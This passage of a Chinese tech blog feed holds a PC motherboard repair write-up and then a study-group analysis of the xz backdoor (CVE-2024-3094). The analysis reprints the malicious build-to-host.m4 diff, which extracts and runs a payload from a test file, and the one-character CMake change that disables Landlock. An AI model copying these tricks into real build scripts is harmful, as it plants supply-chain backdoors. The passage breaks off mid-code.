    <content type="html"><![CDATA[<h1 id="前情提要">前情提要</h1><p>簡單來說，當時我正在讓服務器跑從遠端備份回來文件的哈希來驗證完整性，結果回頭一看服務器，發現就關機了。</p><h1 id="症狀">症狀</h1><p>此時CPU右上角的紅色LED亮起，按開機鍵都無反應，斷電重新上電紅色LED仍然點亮，這個時候我的第一猜測是可能是CPU過熱，也許讓他散熱一下就能好了。</p><p>在過一陣子重新上電後，紅色LED不亮了，現在按開機鍵則變成整台機器的LED瞬間閃爍一次，主板偵錯碼(Q-code)也是和LED一樣瞬間閃00後，之後按開機鍵也無任何反應，不過將電源供應器重新上電後又會有同樣的行為。</p><h1 id="偵錯">偵錯</h1><p>在經過Google搜尋X99的這些症狀後，我最後定位到了一個可能的問題——華碩X99通病(MOS擊穿燒CPU)</p>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-d9a9cf04" role="button" aria-expanded="false" aria-controls="collapse-d9a9cf04">        <div class="fold-arrow">▶</div>網路上其他人遇到的狀況      </div>      <div class="fold-collapse collapse" id="collapse-d9a9cf04">        <div class="fold-content">          <p><a href="https://www.techpowerup.com/forums/threads/asus-x99-deluxe-a-ii-failed.262537/">ASUS X99-DELUXE A-II Failed | TechPowerUp Forums</a><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[ASUS X99-DELUXE A-II Failed | TechPowerUp Forums](https://www.techpowerup.com/forums/threads/asus-x99-deluxe-a-ii-failed.262537/)">[1]</span></a></sup></p><p><a href="https://www.overclock.net/threads/asus-x99-a-ii-code-00-not-listed-red-cpu-light-on.1615149/">ASUS X99 A-II Code 00 (Not Listed) Red CPU Light On | Overclock.net</a><sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[ASUS X99 A-II Code 00 (Not Listed) Red CPU Light On | Overclock.net](https://www.overclock.net/threads/asus-x99-a-ii-code-00-not-listed-red-cpu-light-on.1615149/)">[2]</span></a></sup></p><p><a href="https://www.reddit.com/r/buildapc/comments/5sywuu/x99_a_ii_will_not_post/">X99 A II will not POST!! : r/buildapc</a><sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[X99 A II will not POST!! : r/buildapc](https://www.reddit.com/r/buildapc/comments/5sywuu/x99_a_ii_will_not_post/)">[3]</span></a></sup></p><p><a href="https://forums.tomshardware.com/threads/asus-x99-a-ii-suddenly-shutdown-and-now-giving-q-code-00.2915943/">Asus X99-A II suddenly shutdown and now giving Q code 00 | Tom’s Hardware Forum</a><sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Asus X99-A II suddenly shutdown and now giving Q code 00 | Tom's Hardware Forum](https://forums.tomshardware.com/threads/asus-x99-a-ii-suddenly-shutdown-and-now-giving-q-code-00.2915943/)">[4]</span></a></sup></p>        </div>      </div>    </div><h1 id="檢測">檢測</h1><p>那麼，對電腦的錯誤有了猜測，接下來就是檢測了</p><h2 id="主機板">主機板</h2><p>在開始檢測前可以先看底下這篇文章來大致了解主板供電的組成</p><p><a href="https://forum.gamer.com.tw/C.php?bsn=60030&amp;snA=512806">【科普】主機板供電能力解析</a><sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="[【科普】主機板供電能力解析 @電腦應用綜合討論 哈啦板 - 巴哈姆特](https://forum.gamer.com.tw/C.php?bsn=60030&snA=512806)">[5]</span></a></sup></p>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-55b26b0e" role="button" aria-expanded="false" aria-controls="collapse-55b26b0e">        <div class="fold-arrow">▶</div>CPU供電針腳定義      </div>      <div class="fold-collapse collapse" id="collapse-55b26b0e">        <div class="fold-content">          <p><img src="cpu_power_pin.png" alt=""></p>        </div>      </div>    </div><p>首先將三用電表打到測通檔(二極體檔)，量測CPU供電12V和電感下端</p><p>12V對電感下端短路，這邊就基本可以宣告CPU死定了，12V直衝CPU</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="mb_cpu_12V_test1.jpg" alt=""></div><div class="group-image-wrap"><img src="mb_cpu_12V_test2.jpg" alt=""></div></div></div><p>同時12V也對地短路了</p><p>這也可以解釋為什麼之前開機一瞬間燈會閃一下，但之後按開機卻再也沒有反應，直到斷電重來。</p><p>主板在開機按下時短接PS_ON和GND，拉低PS_ON，電源啟動，輸出12V，但是CPU供電短路，電源供應器自動保護斷電，之後也不開啓，直到斷電重置。</p>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-2f23950e" role="button" aria-expanded="false" aria-controls="collapse-2f23950e">        <div class="fold-arrow">▶</div>主機板供電針腳定義      </div>      <div class="fold-collapse collapse" id="collapse-2f23950e">        <div class="fold-content">          <p><img src="mb_power_pin.jpg" alt=""></p>        </div>      </div>    </div><p>現在知道主機板有短路後，就繼續排查哪裡出了問題，首先拆下供電散熱檢查底下的MOS</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="mb_mos.jpg" alt=""></div><div class="group-image-wrap"><img src="mos.jpg" alt=""></div><div class="group-image-wrap"><img src="mos_datasheet.png" alt=""></div></div></div><p>MOS的型號是0812ND，查看datasheet可以知道這是一顆集成上下管的IC。</p><p>需要量測的就是這顆IC裡的上下管正不正常。</p><p>首先量測上管，也就是1腳和2/3/4任一腳(Gate和Drain，圓點位置代表第一腳)，發現右數第三顆的阻值不對(左圖)，右圖則是正常的MOS應該有的讀值。</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="mos_test_bad.jpg" alt=""></div><div class="group-image-wrap"><img src="mos_test_good.jpg" alt=""></div></div></div><p>這代表第三顆MOS的上管擊穿了直接短路，Vphase(Source)在底下連到電感，12V直接導到CPU。</p><p>順便量測了所有的下管，結果都是正常。</p><p>理論上只要更換壞掉的MOS應該就能修好這塊主板，等之後有時間再來修。</p><h2 id="CPU">CPU</h2><p>雖然前面已經猜測這顆CPU死定了，不過不看到確切的結果還是不會認命</p><p>首先要找到2011-3腳位的定義，不過幸好已經有人幫我們畫出來了</p><p><a href="https://imgur.com/gallery/intel-socket-2011v3-land-grid-layout-thanks-sdgus68-12PjUu8">Intel Socket 2011v3 Land Grid Layout. (Thanks sdgus68!) - computer hardware post - Imgur</a><sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Intel Socket 2011v3 Land Grid Layout. (Thanks sdgus68!) - computer hardware post - Imgur](https://imgur.com/gallery/intel-socket-2011v3-land-grid-layout-thanks-sdgus68-12PjUu8)">[6]</span></a></sup></p><p><a href="https://www.reddit.com/r/intel/comments/lpp83e/lga20113_landlayout/">LGA2011-3 Land-Layout : r/intel</a><sup id="fnref:7" class="footnote-ref"><a href="#fn:7" rel="footnote"><span class="hint--top hint--rounded" aria-label="[LGA2011-3 Land-Layout : r/intel](https://www.reddit.com/r/intel/comments/lpp83e/lga20113_landlayout/)">[7]</span></a></sup></p><p>我是使用第一份，我覺得那比較直觀</p>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-045654a6" role="button" aria-expanded="false" aria-controls="collapse-045654a6">        <div class="fold-arrow">▶</div>第一份使用的參考文件      </div>      <div class="fold-collapse collapse" id="collapse-045654a6">        <div class="fold-content">          <p>Imgur原文有提供下載連結，但是有一個已經失效了，可以從<a href="http://szarka.ssgg.sk/Vyuka/2014/HighEnd-LGA2011/core-i7-lga2011-3-tmsdg.pdf">這裡</a>觀看，或是在底下下載</p><p><a href="core-i7-lga2011-3-tmsdg.pdf">core-i7-lga2011-3-tmsdg.pdf</a>的52頁有針腳編號的定義</p><p><a href="core-i7-lga2011-3-datasheet-vol-1.pdf">core-i7-lga2011-3-datasheet-vol-1.pdf</a>的64頁開始有編號對應的用途</p>        </div>      </div>    </div><p><img src="2011-3_layout.png" alt=""></p><p>量測V<sub>CC</sub>和V<sub>SS</sub>的阻值，可以理解為供電和GND，發現短路，徹底給CPU判死刑</p><video controls width="500">  <source src="cpu_test.webm" type="video/webm" />  <source src="cpu_test.mp4" type="video/mp4" /></video><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.techpowerup.com/forums/threads/asus-x99-deluxe-a-ii-failed.262537/">ASUS X99-DELUXE A-II Failed | TechPowerUp Forums</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.overclock.net/threads/asus-x99-a-ii-code-00-not-listed-red-cpu-light-on.1615149/">ASUS X99 A-II Code 00 (Not Listed) Red CPU Light On | Overclock.net</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://www.reddit.com/r/buildapc/comments/5sywuu/x99_a_ii_will_not_post/">X99 A II will not POST!! : r/buildapc</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://forums.tomshardware.com/threads/asus-x99-a-ii-suddenly-shutdown-and-now-giving-q-code-00.2915943/">Asus X99-A II suddenly shutdown and now giving Q code 00 | Tom’s Hardware Forum</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://forum.gamer.com.tw/C.php?bsn=60030&amp;snA=512806">【科普】主機板供電能力解析 @電腦應用綜合討論 哈啦板 - 巴哈姆特</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://imgur.com/gallery/intel-socket-2011v3-land-grid-layout-thanks-sdgus68-12PjUu8">Intel Socket 2011v3 Land Grid Layout. (Thanks sdgus68!) - computer hardware post - Imgur</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://www.reddit.com/r/intel/comments/lpp83e/lga20113_landlayout/">LGA2011-3 Land-Layout : r/intel</a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>疑難雜症</category>
      
    </categories>
    
    
    <tags>
      
      <tag>3C硬體</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有關xz漏洞產生的時間線和原理</title>
    <link href="/xz-CVE-2024-3094/"/>
    <url>/xz-CVE-2024-3094/</url>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>這次主要是準備NCKUCTF的讀書會的主題，順便記錄一下</p><h1 id="時間線">時間線</h1><p><strong>2021-01-27：</strong> 創建JiaT75的Github帳號</p><p><strong>2022-02-07：</strong> 第一次對xz進行<a href="https://github.com/tukaani-project/xz/commit/6468f7e41a8e9c611e4ba8d34e2175c5dacdbeb4">commit</a></p><p><strong>2022-05：</strong> Jia Tan成為了xz的maintainer，被登記到oss-fuzz xz的contact</p><p><strong>2024-02-23：</strong> 上傳了一些測試檔案（包含了含有惡意payload的檔案<code>tests/files/bad-3-corrupt_lzma2.xz</code>、<code>tests/files/good-large_compressed.lzma</code>），<a href="https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0">commit</a></p><p><strong>2024-02-24：</strong> 發布了5.6.0的tarball，包含了帶有問題的build-to-host.m4，帶有後門</p><p><strong>2024-02-26：</strong> 修改了CMakeLists.txt，關閉了Landlock功能，<a href="https://github.com/tukaani-project/xz/commit/328c52da8a2bbb81307644efdb58db2c422d9ba7">commit</a></p><p><strong>2024-03-09：</strong> 修改了測試檔案（<code>tests/files/bad-3-corrupt_lzma2.xz</code>、<code>tests/files/good-large_compressed.lzma</code>），<a href="https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89">commit</a></p><p><strong>2024-03-09：</strong> 發布了5.6.0的tarball，同樣帶有後門</p><p><strong>2024-03-29：</strong> Andres Freund在測試debian sid時<a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">發現後門</a><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[oss-security - backdoor in upstream xz/liblzma leading to ssh server compromise](https://www.openwall.com/lists/oss-security/2024/03/29/4)">[1]</span></a></sup></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-ae99882e" role="button" aria-expanded="false" aria-controls="collapse-ae99882e">        <div class="fold-arrow">▶</div>有關m4/build-to-host.m4      </div>      <div class="fold-collapse collapse" id="collapse-ae99882e">        <div class="fold-content">          <p>這個檔案不包含在git的source file中，只存在於5.6.0和5.6.1的tarball中，可以在<a href="https://web.archive.org/web/*/https://github.com/tukaani-project/xz/releases/download/*">web archieve</a>中下載，或是點<a href="xz-5.6.0.tar.zst">xz-5.6.0.tar.zst</a>、<a href="xz-5.6.1.tar.zst">xz-5.6.1.tar.zst</a>下載</p><blockquote><p>在C的專案中，有些檔案只存在於tarball，在git中不存在是正常的，因為下游的使用者不需要去知道怎麼用autotools和autoconf<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[FAQ on the xz-utils backdoor (CVE-2024-3094)](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27#design)">[2]</span></a></sup>，不過攻擊者利用了這個慣例，沒有將開啟後門的關鍵放入git中</p></blockquote><h2 id="有關m4-gitignore">有關m4/.gitignore.</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+ build-to-host.m4</span><br>  codeset.m4<br>  extern-inline.m4<br>  fcntl-o.m4<br></code></pre></td></tr></table></figure><p>這個其實和攻擊沒什麼關係，不過github上這個<a href="https://github.com/tukaani-project/xz/commit/4323bc3e0c1e1d2037d5e670a3bf6633e8a3031e">commit</a>的<a href="https://github.com/tukaani-project/xz/commit/4323bc3e0c1e1d2037d5e670a3bf6633e8a3031e#commitcomment-140386077">留言</a>挺有意思</p><p><img src="github_comment.png" alt=""></p>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-7d97e640" role="button" aria-expanded="false" aria-controls="collapse-7d97e640">        <div class="fold-arrow">▶</div>有關Landlock      </div>      <div class="fold-collapse collapse" id="collapse-7d97e640">        <div class="fold-content">          <p>懶人包</p><p>這是一種在linux內核(&gt;5.15)實現的安全模型，讓process在較低權限運行，且限制其對系統資源的訪問，可用於創建沙盒和隔離危險操作<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[landlock(7) - Linux manual page](https://man7.org/linux/man-pages/man7/landlock.7.html)">[3]</span></a></sup></p><p>使用sys/prctl.h中的prctl()來配置landlock</p>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-976a22fc" role="button" aria-expanded="false" aria-controls="collapse-976a22fc">        <div class="fold-arrow">▶</div>Lasse Collin在收到的郵件中被要求新增維護者      </div>      <div class="fold-collapse collapse" id="collapse-976a22fc">        <div class="fold-content">          <p>以下資訊來自此<a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00562.html">Mail Archieve</a></p><p><strong>2022-05-19：</strong> Dennis Ens詢問XZ for java是否還在開發</p><p><strong>2022-05-19：</strong> Lasse Collin回覆表示有很多工作在處理，但是仍有在開發，只是精力比較專注於XZ Utils的開發，在最後提到 Jia Tan在未來可能會發揮更多作用</p><p><strong>2022-06-07：</strong> Jigar Kumar回覆施壓Lasse Collin要求他為項目新增維護者</p><p><strong>2022-06-08：</strong> Lasse Collin回覆表示他有長期的心理問題，這個項目是一個無償維護的項目，他仍然有在努力開發，再次提到 Jia Tan在未來可能會發揮更多作用</p><p><strong>2022-06-14：</strong> Jigar Kumar回復懷疑他們是否能夠如其發布版本，再次要求新增維護者</p><p><strong>2022-06-21：</strong> Dennis Ens對Lasse Collin的心理問題感到抱歉，同樣也要求新增維護者</p><p><strong>2022-06-29：</strong> Lasse Collin最後回覆新增維護者他已經思考很久了，Jia Tan很有可能在未來發生更大的作用</p>        </div>      </div>    </div><h1 id="攻擊手法">攻擊手法</h1><h2 id="CMakeLists-txt">CMakeLists.txt</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs diff"> # Sandboxing: Landlock<br> if(NOT SANDBOX_FOUND AND ENABLE_SANDBOX MATCHES &quot;^ON$|^landlock$&quot;)<br><span class="hljs-deletion">-    check_include_file(linux/landlock.h HAVE_LINUX_LANDLOCK_H)</span><br><span class="hljs-addition">+    # A compile check is done here because some systems have</span><br><span class="hljs-addition">+    # linux/landlock.h, but do not have the syscalls defined</span><br><span class="hljs-addition">+    # in order to actually use Linux Landlock.</span><br><span class="hljs-addition">+    check_c_source_compiles(&quot;</span><br><span class="hljs-addition">+        #include &lt;linux/landlock.h&gt;</span><br><span class="hljs-addition">+        #include &lt;sys/syscall.h&gt;</span><br><span class="hljs-addition">+        #include &lt;sys/prctl.h&gt;</span><br><span class="hljs-addition">+.</span><br><span class="hljs-addition">+        void my_sandbox(void)</span><br><span class="hljs-addition">+        &#123;</span><br><span class="hljs-addition">+            (void)prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);</span><br><span class="hljs-addition">+            (void)SYS_landlock_create_ruleset;</span><br><span class="hljs-addition">+            (void)SYS_landlock_restrict_self;</span><br><span class="hljs-addition">+            (void)LANDLOCK_CREATE_RULESET_VERSION;</span><br><span class="hljs-addition">+            return;</span><br><span class="hljs-addition">+        &#125;</span><br><span class="hljs-addition">+        int main(void) &#123; return 0; &#125;</span><br><span class="hljs-addition">+        &quot;</span><br><span class="hljs-addition">+    HAVE_LINUX_LANDLOCK)</span><br><br><span class="hljs-deletion">-    if(HAVE_LINUX_LANDLOCK_H)</span><br><span class="hljs-deletion">-        set(SANDBOX_COMPILE_DEFINITION &quot;HAVE_LINUX_LANDLOCK_H&quot;)</span><br><span class="hljs-addition">+    if(HAVE_LINUX_LANDLOCK)</span><br><span class="hljs-addition">+        set(SANDBOX_COMPILE_DEFINITION &quot;HAVE_LINUX_LANDLOCK&quot;)</span><br>         set(SANDBOX_FOUND ON)<br><span class="hljs-comment">------</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/tukaani-project/xz/commit/328c52da8a2bbb81307644efdb58db2c422d9ba7#diff-1e7de1ae2d059d21e1dd75d5812d5a34b0222cef273b7c3a2af62eb747f9d20a">Github上的commit</a></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-d19941a8" role="button" aria-expanded="false" aria-controls="collapse-d19941a8">        <div class="fold-arrow">▶</div>check_c_source_compiles與check_include_file      </div>      <div class="fold-collapse collapse" id="collapse-d19941a8">        <div class="fold-content">          <p>這兩個是cmake定義的函數</p><h3 id="check-c-source-compiles">check_c_source_compiles</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">check_c_source_compiles(&lt;code&gt; &lt;resultVar&gt;<br>                        [FAIL_REGEX &lt;regex1&gt; [&lt;regex2&gt;...]])<br></code></pre></td></tr></table></figure><p>這會檢查<code>&lt;code&gt;</code>的原始碼能否被編譯成連接檔，並將結果存於<code>&lt;resultVar&gt;</code>中<sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="[CheckCSourceCompiles — CMake 3.29.2 Documentation](https://cmake.org/cmake/help/latest/module/CheckCSourceCompiles.html)">[4]</span></a></sup></p><h3 id="check-include-file">check_include_file</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">CHECK_INCLUDE_FILE(&lt;<span class="hljs-keyword">include</span>&gt; &lt;variable&gt; [&lt;flags&gt;])<br></code></pre></td></tr></table></figure><p>這會檢查<code>&lt;include&gt;</code>是否能被引入，並將結果存於<code>&lt;variable&gt;</code>中<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="[CheckIncludeFile — CMake 3.29.2 Documentation](https://cmake.org/cmake/help/latest/module/CheckIncludeFile.html)">[5]</span></a></sup></p>        </div>      </div>    </div><p>這一段的用處是檢查編譯機器是否能啟用Landlock feature</p><p>原本是使用<code>check_include_file()</code>來檢查，Jia Tan將其改為使用<code>check_c_source_compiles()</code>來檢查</p><p>理論上這樣更換並不會造成問題，但是在第11行的行首可以看到多了一個<code>.</code>，這導致這段C code會編譯失敗，因此關閉了Landlock，不管在任何的機器上都會關閉，而不是原本的邏輯，只在不支援的機器關閉</p><h2 id="m4-build-to-host-m4">m4/build-to-host.m4</h2><p>5.6.0中的<a href="build-to-host.m4">build-to-host.m4</a>與5.6.1中的完全相同</p><p>攻擊者對標準的build-to-host.m4進行修改，差異如下</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-meta">@@ -1,5 +1,5 @@</span><br><span class="hljs-deletion">-# build-to-host.m4 serial 3</span><br><span class="hljs-deletion">-dnl Copyright (C) 2023 Free Software Foundation, Inc.</span><br><span class="hljs-addition">+# build-to-host.m4 serial 30</span><br><span class="hljs-addition">+dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.</span><br> dnl This file is free software; the Free Software Foundation<br> dnl gives unlimited permission to copy and/or distribute it,<br> dnl with or without modifications, as long as this notice is preserved.<br><span class="hljs-meta">@@ -37,6 +37,7 @@</span> AC_DEFUN([gl_BUILD_TO_HOST],<br><br><br>   dnl Define somedir_c.<br>   gl_final_[$1]=&quot;$[$1]&quot;<br><span class="hljs-addition">+  gl_[$1]_prefix=`echo $gl_am_configmake | sed &quot;s/.*\.//g&quot;`</span><br>   dnl Translate it from build syntax to host syntax.<br>   case &quot;$build_os&quot; in<br>     cygwin*)<br><span class="hljs-meta">@@ -58,14 +59,40 @@</span> AC_DEFUN([gl_BUILD_TO_HOST],<br>   if test &quot;$[$1]_c_make&quot; = &#x27;\&quot;&#x27;&quot;$&#123;gl_final_[$1]&#125;&quot;&#x27;\&quot;&#x27;; then<br>     [$1]_c_make=&#x27;\&quot;$([$1])\&quot;&#x27;<br>   fi<br><span class="hljs-addition">+  if test &quot;x$gl_am_configmake&quot; != &quot;x&quot;; then</span><br><span class="hljs-addition">+    gl_[$1]_config=&#x27;sed \&quot;r\n\&quot; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#x27;</span><br><span class="hljs-addition">+  else</span><br><span class="hljs-addition">+    gl_[$1]_config=&#x27;&#x27;</span><br><span class="hljs-addition">+  fi</span><br><span class="hljs-addition">+  _LT_TAGDECL([], [gl_path_map], [2])dnl</span><br><span class="hljs-addition">+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl</span><br><span class="hljs-addition">+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl</span><br><span class="hljs-addition">+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl</span><br><span class="hljs-addition">+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl</span><br>   AC_SUBST([$1_c_make])<br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  dnl If the host conversion code has been placed in $gl_config_gt,</span><br><span class="hljs-addition">+  dnl instead of duplicating it all over again into config.status,</span><br><span class="hljs-addition">+  dnl then we will have config.status run $gl_config_gt later, so it</span><br><span class="hljs-addition">+  dnl needs to know what name is stored there:</span><br><span class="hljs-addition">+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt=&quot;eval \$gl_[$1]_config&quot;])</span><br> ])<br><br><br> dnl Some initializations for gl_BUILD_TO_HOST.<br> AC_DEFUN([gl_BUILD_TO_HOST_INIT],<br> [<br><span class="hljs-addition">+  dnl Search for Automake-defined pkg* macros, in the order</span><br><span class="hljs-addition">+  dnl listed in the Automake 1.10a+ documentation.</span><br><span class="hljs-addition">+  gl_am_configmake=`grep -aErls &quot;#&#123;4&#125;[[:alnum:]]&#123;5&#125;#&#123;4&#125;$&quot; $srcdir/ 2&gt;/dev/null`</span><br><span class="hljs-addition">+  if test -n &quot;$gl_am_configmake&quot;; then</span><br><span class="hljs-addition">+    HAVE_PKG_CONFIGMAKE=1</span><br><span class="hljs-addition">+  else</span><br><span class="hljs-addition">+    HAVE_PKG_CONFIGMAKE=0</span><br><span class="hljs-addition">+  fi</span><br><span class="hljs-addition">+</span><br>   gl_sed_double_backslashes=&#x27;s/\\/\\\\/g&#x27;<br>   gl_sed_escape_doublequotes=&#x27;s/&quot;/\\&quot;/g&#x27;<br><span class="hljs-addition">+  gl_path_map=&#x27;tr &quot;\t \-_&quot; &quot; \t_\-&quot;&#x27;</span><br> changequote(,)dnl<br>   gl_sed_escape_for_make_1=&quot;s,\\([ \&quot;&amp;&#x27;();&lt;&gt;\\\\\`|]\\),\\\\\\1,g&quot;<br> changequote([,])dnl<br></code></pre></td></tr></table></figure><p>先將檔案中的變數解析出來</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">gl_am_configmake=`grep -aErls &quot;#&#123;4&#125;[[:alnum:]]&#123;5&#125;#&#123;4&#125;$&quot; $srcdir/ 2&gt;/dev/null`<br>gl_am_configmake=$srcdir/tests/files/bad-3-corrupt_lzma2.xz<br>gl_path_map=&#x27;tr &quot;\t \-_&quot; &quot; \t_\-&quot;&#x27;<br><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_prefix=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$gl_am_configmake</span> | sed <span class="hljs-string">&quot;s/.*\.//g&quot;</span>`</span><br><span class="hljs-meta prompt_">gl_[$</span><span class="language-bash">1]_prefix=xz</span><br></code></pre></td></tr></table></figure><p>在這段邏輯中，將會檢查是否有設定<code>gl_am_configmake</code>變數，如果沒有，後門將不會啟動</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">if test &quot;x$gl_am_configmake&quot; != &quot;x&quot;; then<br><span class="hljs-meta prompt_">  gl_[$</span><span class="language-bash">1]_config=<span class="hljs-string">&#x27;sed \&quot;r\n\&quot; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#x27;</span></span><br>else<br><span class="hljs-meta prompt_">  gl_[$</span><span class="language-bash">1]_config=<span class="hljs-string">&#x27;&#x27;</span></span><br>fi<br></code></pre></td></tr></table></figure><p><code>gl_[$1]_config</code>將在<code>AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt=&quot;eval \$gl_[$1]_config&quot;])</code>中執行</p><p>如果變數存在，<code>gl_[$1]_config</code>將會從<code>tests/files/bad-3-corrupt_lzma2.xz</code>中拿到phase 1 payload，在5.6.0和5.6.1版本具有差異</p><p><strong>5.6.0</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 